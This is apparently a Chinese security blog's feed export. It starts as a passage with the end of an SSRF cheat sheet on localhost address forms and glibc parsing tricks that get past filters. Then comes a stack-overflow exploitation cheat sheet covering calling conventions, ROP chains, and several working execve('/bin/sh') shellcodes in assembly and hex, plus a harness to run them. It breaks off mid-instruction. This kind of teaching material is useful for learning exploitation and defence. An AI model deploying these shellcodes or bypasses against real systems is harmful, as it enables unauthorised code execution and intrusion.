<code>http://0.0.0.0/</code>，或者<code>http://[0000::1]/</code> 等价于<code>http://127.0.0.1/</code>。</p><p>以下 IPv6 地址均可访问本机：</p><ul><li>::127.0.0.1</li><li>::ffff:127.0.0.1</li><li>::1%1</li></ul><h2 id="Glibc 解析"><a href="#Glibc 解析" class="headerlink" title="Glibc 解析"></a>Glibc 解析 </h2><p> 在 glibc 函数 <code>gethostbyname</code> 中，存在部分解析问题。</p><ul><li>支持字符转义，例如 <code>b\\097idu.com</code> 等价于 <code>baidu.com</code>，其中<code>\097</code> 为十进制的<code>a</code>。</li><li>多余的反斜杠会被忽略，例如 <code>\\b\\a\\i\\d\\u.\\c\\o\\m</code> 等价于<code>baidu.com</code>。</li><li>第一个空白字符后的数据会被忽略，例如 <code>127.0.0.1 abc</code> 等价于<code>127.0.0.1</code>。</li></ul><p>因此若底层使用该函数进行解析，则可以采用上述方法绕过。</p><h2 id="内网 IP"><a href="# 内网 IP" class="headerlink" title="内网 IP"></a>内网 IP</h2><p>以下 IP 范围均输入内网 IP：</p><ul><li>10.0.0.0/8</li><li>172.16.0.0/12</li><li>192.168.0.0/16</li></ul>]]></content>
      
      
      <categories>
          
          <category> CheatSheet </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Stack Overflow CheatSheet</title>
      <link href="/2021/08/14/StackOverflow-CheatSheet/"/>
      <url>/2021/08/14/StackOverflow-CheatSheet/</url>
      
        <content type="html"><![CDATA[<blockquote><p>本文中的内容均以 x86 架构为基础</p></blockquote><h1 id="Registers"><a href="#Registers" class="headerlink" title="Registers"></a>Registers</h1><p>32 位程序寄存器最大 32 位（4 字节）如 eax，64 位程序寄存器最大 64 位（8 字节）如 rax。寄存器大小示意图如下。</p><p><img src="/2021/08/14/StackOverflow-CheatSheet/2.png"></p><h1 id="Stack"><a href="#Stack" class="headerlink" title="Stack"></a>Stack</h1><p>栈是一种后入先出（LIFO）的数据结构，在内存空间中由高地址向低地址生长，如下所示。</p><p><img src="/2021/08/14/StackOverflow-CheatSheet/1.png"></p><h1 id="Call-a-Func"><a href="#Call-a-Func" class="headerlink" title="Call a Func"></a>Call a Func</h1><p>程序执行过程中所调用的每一个函数都有属于其自己的栈帧（Stack Frame），栈帧中保存该函数内部使用的各种局部变量。每个函数的栈帧由栈底寄存器 ebp 和栈顶寄存器 esp 确定，其中 esp 可能随着函数内部的执行而变化，ebp 一直不变，所以大部分局部变量与函数参数的位置均根据 ebp 来确定。</p><p>在调用一个新函数时需要做三件事：</p><ol><li>传递参数，32 位与 64 位参数传递方式不同：32 位程序将参数从右向左压入栈中传递，64 位程序前 6 个参数通过寄存器 rdi，rsi，rdx，rcx，r8，r9 传递，从第 7 个参数开始从右向左压入栈中传递</li><li>保存返回地址，即调用完新函数以后要执行的下一条指令地址，该操作由 call 指令完成，即<code>call = (push eip &amp;&amp; eip = ret_addr)</code></li><li>进入被调用者的流程，被调用者保存调用者的栈帧，在栈上 push 当前 ebp，之后使 esp=ebp，即<code>push ebp &amp;&amp; esp = ebp</code>，最后开辟新栈帧</li></ol><p>当一个函数执行完成后需要做三件事：</p><ol><li>传递返回值到 eax 中，若返回值大于 4 字节小于 8 字节，则高 4 字节放入 eax，低 4 字节放入 edx</li><li>恢复调用者的栈帧，恢复原来的 esp，使 esp=epb，并且 pop 栈上的 old ebp 到当前 ebp 中，该操作由 leave 指令完成，即<code>(esp = ebp &amp;&amp; pop ebp)</code></li><li>跳转到执行完函数的下一条地址，恢复到调用者的执行流程，该操作由 ret 指令完成，即<code>ret = pop eip</code></li></ol><p>常见 32 位调用约定如下，64 位只有一种调用约定，前 6 个参数通过寄存器 rdi，rsi，rdx，rcx，r8，r9 传递，从第 7 个参数开始从右向左入栈</p><ul><li>cdecl：C 函数 /C++ 非成员函数默认的调用约定，参数从右向左入栈，调用者清理栈中参数，eax 存放返回值，支持可变参数（例如 printf）</li><li>stdcall：Pascal 或 WinAPI 常用，参数从右向左入栈，被调用者清理栈中参数，eax 存放返回值</li><li>fastcall：前两个小于 4 字节的参数使用 ecx 和 edx 传递，其余参数从右向左入栈，被调用者清理栈中参数，eax 存放返回值</li><li>thiscall：C++ 非静态的成员函数使用，C++ 成员函数需要使用 this 指针，若参数数量固定，则 this 指针通过 ecx 传递，其余参数从右向左入栈，被调用者清理栈中参数；若参数数量不固定，所有参数从右向左入栈，最后 this 指针入栈，调用者清理栈中参数</li></ul><p>发生函数调用 <code>func(1, 2, 3)</code> 时，栈变化如下所示（cdecl，32 位，64 位除了参数传递使用寄存器以外其余均相同），其中 ret 表示 call func 指令结束之后下一条指令的地址，即返回地址，old ebp 表示调用者栈帧的 ebp。</p><p><img src="/2021/08/14/StackOverflow-CheatSheet/3.png"></p><p>函数 func 执行完毕后，栈变化如下所示（cdecl，32 位），为了便于表示，将 leave 指令拆分为两条指令。</p><p><img src="/2021/08/14/StackOverflow-CheatSheet/4.png"></p><h1 id="Stack-Overflow"><a href="#Stack-Overflow" class="headerlink" title="Stack Overflow"></a>Stack Overflow</h1><p>局部变量保存在栈中，当程序接受用户输入并且保存到局部变量中时，若接收到的数据长度大于栈中给局部变量预留的数据长度，则可以发生溢出，修改局部变量之后的数据，包括 old ebp 以及 ret，如果可以修改 ret，就可以劫持控制流，当函数执行结束以后就可以跳转到任意指定地址。栈溢出过程如下图所示，假设 func 函数中有一块 16 字节大小的局部变量 buf，但是接收到了超过 16 字节大小的数据并且被写入到 buf 中，假设输入的数据为<code>&#39;A&#39;*(16+4) + &#39;B&#39;*4</code>，可以看到返回地址 ret 已经被修改为 BBBB，将 payload 中的 BBBB 修改为其他有可执行权限的地址即可。</p><p><img src="/2021/08/14/StackOverflow-CheatSheet/5.png"></p><p>可能会造成栈溢出的函数</p><ul><li><p>read</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 从文件 fd 中读取 nbyte 个字节写入到 buf 中</span></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">read</span> <span class="params">(<span class="type">int</span> fd, <span class="type">void</span> *buf, <span class="type">size_t</span> nbyte)</span>;</span><br><span class="line"><span class="comment">// fd: 文件描述符，0 为从标准输入读取</span></span><br><span class="line"><span class="comment">// buf: 要写入位置的指针</span></span><br><span class="line"><span class="comment">// nbyte: 要读取的字节数</span></span><br><span class="line"><span class="comment">// 返回实际读取到字节数，若返负数表示出现了错误</span></span><br></pre></td></tr></table></figure></li><li><p>write</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 从 buf 中读取 nbytes 个字节写入到文件 fd 中</span></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">write</span><span class="params">(<span class="type">int</span> fd,<span class="type">const</span> <span class="type">void</span> *buf,<span class="type">size_t</span> nbytes)</span>;</span><br><span class="line"><span class="comment">// fd: 文件描述符，1 表示输出到标准输出</span></span><br><span class="line"><span class="comment">// buf: 要读取位置的指针</span></span><br><span class="line"><span class="comment">// nbyte: 要写入的字节数</span></span><br><span class="line"><span class="comment">// 返回实际写入到字节数，若返回负数表示出现了错误</span></span><br></pre></td></tr></table></figure></li><li><p>gets</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 从标准输入缓冲区中读取字符串到 str 所指的位置中</span></span><br><span class="line"><span class="comment">// gets 会从输入缓冲区读取到换行符为止，作为一个字符串，并且删去最后的换行符写入 str 中</span></span><br><span class="line"><span class="comment">// gets 可以读取空格</span></span><br><span class="line"><span class="type">char</span> *<span class="title function_">gets</span><span class="params">(<span class="type">char</span> *str)</span>;</span><br><span class="line"><span class="comment">// str: 要写入位置的指针</span></span><br><span class="line"><span class="comment">// 若读取成功返回写入位置的指针，否则返回空指针</span></span><br></pre></td></tr></table></figure></li><li><p>scanf</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 从标准输入缓冲区中读取符合格式的字符串，遇到空格停止读取</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">scanf</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *format, ...)</span>;</span><br><span class="line"><span class="comment">// format: 格式化字符串</span></span><br><span class="line"><span class="comment">// ...: 需要被格式化到 format 的参数</span></span><br><span class="line"><span class="comment">// 若读取成功，返回匹配和赋值的个数，否则返回 EOF</span></span><br></pre></td></tr></table></figure></li><li><p>strcpy/strncopy/memcpy</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 从原指针指向的位置读取指定数量字节写入到目标指针的位置</span></span><br><span class="line"><span class="comment">// strcpy/strncpy 只支持字符串的复制，memcpy 可以复制任何内容</span></span><br><span class="line"><span class="comment">// strcpy 函数读取到 \0 为止，会将 \0 复制到目标位置，而 strncpy 不会添加 \0，若 src 的长度小于 n 字节则用 \0 填充</span></span><br><span class="line"><span class="type">char</span>* <span class="title function_">strcpy</span><span class="params">(<span class="type">char</span>* dest, <span class="type">const</span> <span class="type">char</span>* src)</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">memcpy</span><span class="params">(<span class="type">void</span> *dest, <span class="type">const</span> <span class="type">void</span> *src, <span class="type">size_t</span> count )</span>;</span><br><span class="line"><span class="type">char</span> *<span class="title function_">strncpy</span><span class="params">(<span class="type">char</span> *dest,<span class="type">char</span> *src,<span class="type">int</span> <span class="type">size_t</span> n)</span>;</span><br><span class="line"><span class="comment">// dest: 要写入的位置的指针</span></span><br><span class="line"><span class="comment">// src: 原位置的指针</span></span><br><span class="line"><span class="comment">// count/n: 要写入的字节数</span></span><br><span class="line"><span class="comment">// 若复制成功返回目标位置的指针，否则返回空指针</span></span><br></pre></td></tr></table></figure></li><li><p>strcat</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将 src 添加到 dest 的末尾，删除 dest 末尾的 \0，连同 src 中的 \0 一起复制到 dest 的末尾</span></span><br><span class="line"><span class="type">char</span> *<span class="title function_">strcat</span><span class="params">(<span class="type">char</span> *dest, <span class="type">const</span> <span class="type">char</span> *src)</span>;</span><br><span class="line"><span class="comment">// dest: 目标字符串的指针</span></span><br><span class="line"><span class="comment">// src: 要追加的字符串的指针</span></span><br><span class="line"><span class="comment">// 返回指向 dest 的指针</span></span><br></pre></td></tr></table></figure></li></ul><p>栈溢出寻找方法：</p><ol><li><p>在函数中寻找类似于 buf 的局部变量</p></li><li><p>在函数中找到向该 buf 写入数据的函数</p></li><li><p>检查可写入的最大大小是否能够超过 buf 定义大小</p></li><li><p>若可以溢出，则查看 buf 在栈中的位置，寻找 buf 之后是否有其他局部变量，或者是否可以溢出到 ret</p></li><li><p>计算出 buf 到达目标的总长度，进行溢出，目标可以是 ret，buf 之后的其他局部变量或者 bss 段上的某些全局变量</p></li></ol><p>基本套路：</p><ol><li>检查程序的防护措施与运行平台</li><li>是静态编译还是动态编译</li><li>找到溢出点并且想办法劫持程序流程</li><li>静态编译会提供大量的 gadgets，需要利用 ROP 跳转到 shellcode 或者拼凑出系统调用</li><li>动态编译则需要想办法泄漏出一个 libc 中的地址，最后利用 libc 中的 system 执行命令</li><li>拿到 libc 的地址以后找到对应版本的 libc（如果题目没有提供 libc）</li><li>计算出 libc 的基地址，进而计算出 system 的地址</li><li>跳转到 system 从而 getshell</li></ol><p>其实栈溢出的目的就是劫持控制流，也就是控制 eip 寄存器，而 eip 寄存器又何 esp，ebp 息息相关，如果可以在 ret 指令之前控制 esp 的话，甚至不用覆盖 ret 也可以劫持控制流，或者如果控制 ebp 的话甚至可以控制栈低后面的 ret。</p><h1 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h1><p>ROP 即 Return-Oriented programming（面向返回编程），其最大的作用就是可以绕过多种安全保护措施，并且可以帮助我们 Getshell。ROP 是指利用程序中碎小的代码片段来操作寄存器，甚至改变程序流程的技术，这些小的代码片段被称为 gadgets。一个 gadget 通常是以 ret 或者 jmp 等跳转指令结尾的代码片段，最常用的是以 ret 结尾，ret 指令可以从栈顶弹出一个值到 eip 中，控制程序下一条指令的地址，如果我们可以控制栈上的元素，就可以利用多个 gadgets 形成 ROP 链，不过需要事先得知每个 gadget 的地址。</p><p>通常使用静态编译的程序中会包含大量可用的 gadgets，动态编译的程序中也含有少量可以使用的 gadgets，收集到足够多的 gadgets 以后就可以修改寄存器的值并且控制程序的流程。利用多个 gadgets 修改寄存器以后可以直接调用 syscall，也可以直接跳转到写入内存中的 shellcode 的地址，或者跳转到 libc 中可以执行系统命令函数的地址。</p><p>ROP 技术需要有一定汇编指令的基础，并且关键在于如何合理组合各种 gadgets 形成完美的 ROP 链。ROP 链首先需要从栈溢出修改返回地址开始，最后结束于各种可以 getshell 的方式。一个简单的 ROP 示例如下，假设目前已经在程序中找到了一个可用的 ROP 链，这里以 64 位为例，并且最终目的是调用 execve 的系统调用。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Gadgets:</span><br><span class="line">    0x400686 : pop rdi ; ret</span><br><span class="line">    0x4101f3 : pop rsi ; ret</span><br><span class="line">    0x4498b5 : pop rdx ; ret</span><br><span class="line">    0x415664 : pop rax ; ret</span><br><span class="line">    0x40129c : syscall</span><br></pre></td></tr></table></figure><p>ROP 的目的就是在程序中需找大量可以控制寄存器与程序流程的汇编指令，例如各种 pop 指令，call 指令与 jmp 指令，并且将这些指令通过栈串联起来，此外如果程序中没有合适的指令，也可以通过指令偏移构造合适的指令（不同的机器码解析出的指令也不同）。</p><p>栈溢出发生后栈中情况如下图所示，其中 addr_of_bin_sh 代表字符串 <code>/bin/sh</code> 的地址。execve 的系统调用需要 3 个参数，第一个参数是需要执行的系统命令的字符串，第二个参数是该命令的参数，第三个参数为该命令的环境变量，通常第一个参数为字符串<code>/bin/sh</code>，第二第三个参数均为 0，代表空。</p><p><img src="/2021/08/14/StackOverflow-CheatSheet/6.png"></p><h1 id="Syscall"><a href="#Syscall" class="headerlink" title="Syscall"></a>Syscall</h1><p>Getshell 的方式之一。系统调用是为了用户空间与系统内核空间进行交互所提供的一组接口，在用户空间运行的程序通过 syscall 向内核发送请求，内核收到请求后负责执行，请求的参数一般通过寄存器传递，最后通过软中断使程序进入内核态执行对应操作。在 32 位系统下使用 <code>int 0x80</code> 指令启动系统调用，64 位系统下使用 <code>syscall</code>指令。一般通过 ROP 构造系统调用，构造系统调用的过程如上节所示。常用的系统调用如下，更多的系统调用参数请参考<code>Syscall CheatSheet</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">execve</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">char</span> *<span class="type">const</span> argv[], <span class="type">char</span> *<span class="type">const</span> envp[])</span>;</span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">read</span><span class="params">(<span class="type">int</span> fd, <span class="type">void</span> *buf, <span class="type">size_t</span> nbytes)</span>;</span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">write</span><span class="params">(<span class="type">int</span> fd, <span class="type">void</span> *buf, <span class="type">size_t</span> nbytes)</span>;</span><br></pre></td></tr></table></figure><h1 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h1><p>Getshell 的方式之一，主要通过 execve 系统调用执行命令。shellcode 是一组机器码，一般通过直接编写汇编语言后生成机器码，之后通过栈溢出将 shellcode 写入某个具有可执行权限的地址以后跳转到 shellcode 的地址即可执行 shellcode。</p><p>shellcode 通常越少越好，另外 shellcode 中需要避免出现坏字符 <code>\x00</code>，坏字符会导致 shellcode 写入目标地址时发生截断，如果 shellcode 中需要用到数字 0，可以利用其它方式获取，例如<code>xor eax eax</code> 即可将 eax 置 0，此外在 shellcode 中操作立即数时，应该根据立即数的大小尽量选择合适的寄存器，例如 <code>mov al, 0x1</code> 要比 <code>mov rax, 0x1</code> 更好，后者会使 shellcode 变得更长，也可能会使 shellcode 中出现坏字符。</p><p>execve 的第一个参数也就是要执行的命令，一般都会是 <code>/bin/sh</code>，如果该字符串被保存在栈中时，由于栈是从高地址向低地址生长，因此字符串也应该反向写入栈中，另外为了内存对齐，字符串的长度需要为机器字长的倍数，所以采用<code>//bin/sh</code>。若出于某种原因，shellcode 中无法使用栈（不能利用 pop 与 push 指令），可以先利用 write 或者 read 系统调用将字符串<code>/bin/sh</code> 写入某个内存中的地方。若在 shellcode 执行的上下文环境中没有合适的地址，可以先执行一次 read 系统调用，部分系统调用结束以后会改变某些寄存器的值为某个地址。</p><p>编写 shellcode 的方法如下：</p><ol><li><p>编写对应的汇编代码（以 32 位机器为例）</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Section .text</span><br><span class="line"></span><br><span class="line">global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    ; eax=11 ebx=&quot;//bin/sh&quot; ecx=[&quot;//bin/sh&quot;, NULL] edx=NULL</span><br><span class="line"></span><br><span class="line">    xor eax, eax  ; Get zero</span><br><span class="line"></span><br><span class="line">    ; The first arg</span><br><span class="line">    push eax  ; The string ending \x00</span><br><span class="line">    push 0x68732f6e</span><br><span class="line">    push 0x69622f2f  ; &quot;//bin/sh&quot;</span><br><span class="line">    mov ebx, esp  ; ebx=&quot;//bin/sh&quot;</span><br><span class="line"></span><br><span class="line">    ; NULL at argv[1]</span><br><span class="line">    push eax </span><br><span class="line">    mov edx, esp  ; edx=NULL</span><br><span class="line"></span><br><span class="line">    ; Address of &quot;//bin/sh&quot; at argv[0]</span><br><span class="line">    push ebx</span><br><span class="line">    mov ecx, esp  ;ecx=[&quot;//bin/sh&quot;, NULL]</span><br><span class="line"></span><br><span class="line">    ; Call execve</span><br><span class="line">    mov al, 11</span><br><span class="line">    int 0x80</span><br></pre></td></tr></table></figure></li><li><p>汇编</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nasm -f elf32 shell.asm</span><br></pre></td></tr></table></figure></li><li><p>提取 shellcode 并检查是否出现<code>\x00</code></p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d ./shell |grep <span class="string">&#x27;[0-9a-f]:&#x27;</span>|grep -v <span class="string">&#x27;file&#x27;</span>|<span class="built_in">cut</span> -f2 -d:|<span class="built_in">cut</span> -f1-6 -d<span class="string">&#x27; &#x27;</span>|<span class="built_in">tr</span> -s <span class="string">&#x27; &#x27;</span>|<span class="built_in">tr</span> <span class="string">&#x27;\t&#x27;</span> <span class="string">&#x27; &#x27;</span>|sed <span class="string">&#x27;s/ $//g&#x27;</span>|sed <span class="string">&#x27;s/ /\\x/g&#x27;</span>|<span class="built_in">paste</span> -d <span class="string">&#x27;&#x27;</span> -s |sed <span class="string">&#x27;s/^/&quot;/&#x27;</span>|sed <span class="string">&#x27;s/$/&quot;/g&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>优化 shellcode</p></li><li><p>测试 shellcode</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -fno-stack-protector -z norelro -no-pie -z execstack shellcode.c -o shellcode</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> shellcode[] = <span class="string">&quot;\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> (*func)();</span><br><span class="line">    func = (<span class="type">int</span> (*)()) shellcode;</span><br><span class="line">    (<span class="type">int</span>)(*func)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>这里提供了一些可用的 shellcode（来自<a href="www.exploit-db.com">exploit-db</a>）</p><ol><li><p>前文 shellcode（x86，25 bytes）</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">; &quot;\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&quot;</span><br><span class="line"></span><br><span class="line">xor eax, eax  ; Get zero</span><br><span class="line">push eax  ; The string ending \x00</span><br><span class="line">push 0x68732f6e</span><br><span class="line">push 0x69622f2f  ; &quot;//bin/sh&quot;</span><br><span class="line">mov ebx, esp  ; ebx=&quot;//bin/sh&quot;</span><br><span class="line"></span><br><span class="line">; NULL at argv[1]</span><br><span class="line">push eax </span><br><span class="line">mov edx, esp  ; edx=NULL</span><br><span class="line"></span><br><span class="line">; Address of &quot;//bin/sh&quot; at argv[0]</span><br><span class="line">push ebx</span><br><span class="line">mov ecx, esp  ;ecx=[&quot;//bin/sh&quot;, NULL]</span><br><span class="line"></span><br><span class="line">; Call execve</span><br><span class="line">mov al, 11</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure></li><li><p>execve（x86，18 bytes）</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">; &quot;\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span><br><span class="line"></span><br><span class="line">push   0xb</span><br><span class="line">pop    eax</span><br><span class="line">push   ebx</span><br><span class="line">push   0x68732f2f</span><br><span class="line">push   0x6e69622f</span><br><span class="line">mov    ebx,esp</span><br><span class="line">int    0x80</span><br></pre></td></tr></table></figure></li><li><p>execve（x86，19 bytes）</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">; &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80&quot;</span><br><span class="line"></span><br><span class="line">xor eax, eax</span><br><span class="line">push eax</span><br><span class="line">push 0x68732f2f</span><br><span class="line">push 0x6e69622f</span><br><span class="line">xchg ebx, esp</span><br><span class="line">mov al, 0xb</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure></li><li><p>execve（x86，24 bytes）</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">; &quot;\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&quot;</span><br><span class="line"></span><br><span class="line">xor eax, eax</span><br><span class="line">cdq</span><br><span class="line">push eax</span><br><span class="line">push 0x68732f2f</span><br><span class="line">push 0x6e69622f</span><br><span class="line">mov ebx, esp</span><br><span class="line">push eax</span><br><span class="line">push ebx</span><br><span class="line">mov ecx, esp</span><br><span class="line">mov al, 0x0b</span><br><span class="line">int 80h</span><br></pre></td></tr></table></figure></li><li><p>execve（x86-64，21 bytes）</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">; &quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span><br><span class="line"></span><br><span class="line">mul esi</span><br><span class="line">push rax</span><br><span class="line">mov rdi, &quot;/bin//sh&quot;</span><br><span class="line">push rdi</span><br><span class="line">mov rdi, rsp</span><br><span class="line">mov al, 59</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure></li><li><p>execve（x86-64，23 bytes）</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">; &quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;</span><br><span class="line"></span><br><span class="line">xor rsi, rsi</span><br><span class="line">push rsi</span><br><span class="line">mov rdi, 0x68732f2f6e69622f</span><br><span class="line">push rdi</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">push 59</span><br><span class="line">pop rax</span><br><span class="line">cdq</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure></li><li><p>execve（x86-64，24 bytes）</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">; &quot;\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05&quot;</span><br><span class="line"></span><br><span class="line">push rax</span><br><span class="line">xor rdx, rdx</span><br><span class="line">xor rsi, rsi</span><br><span class="line">mov rbx, &#x27;/bin//sh&#x27;</span><br><span class="line">push rbx</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">mov al, 59</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure></li><li><p>execve（x86-64，30 bytes）</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">; &quot;\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05&quot;</span><br><span class="line"></span><br><span class="line">mov rcx, 0x1168732f6e69622f ;move the immediate value /bin/sh in hex in </span><br><span class="line">;little endian byte order into rcx padded with 11</span><br><span class="line">shl rcx, 